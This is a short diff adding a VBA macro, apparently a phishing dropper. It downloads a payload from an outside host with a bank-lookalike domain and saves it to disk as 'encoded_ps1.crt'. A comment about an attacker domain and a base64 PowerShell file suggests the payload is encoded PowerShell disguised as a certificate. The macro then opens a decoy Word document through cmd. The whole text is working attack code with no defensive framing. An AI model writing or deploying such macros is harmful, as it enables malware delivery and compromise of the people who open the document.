@@ -1,0 +1,17 @@
+Sub downloadtest()
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+    
+'Replace attacker.domain/ps1_b64 with real-world domain and location
+xHttp.Open "GET", "http://www.bankofthewest.online/", False
+
+xHttp.Send
+With bStrm
+ .Type = 1 '//binary
+ .Open
+ .write xHttp.responseBody
+ .savetofile "encoded_ps1.crt", 2 '//overwrite
+End With
+ Shell ("cmd /c start C:\Users\capelm51\Documents\Eric_Jackson.docx")
+ 
+End Sub
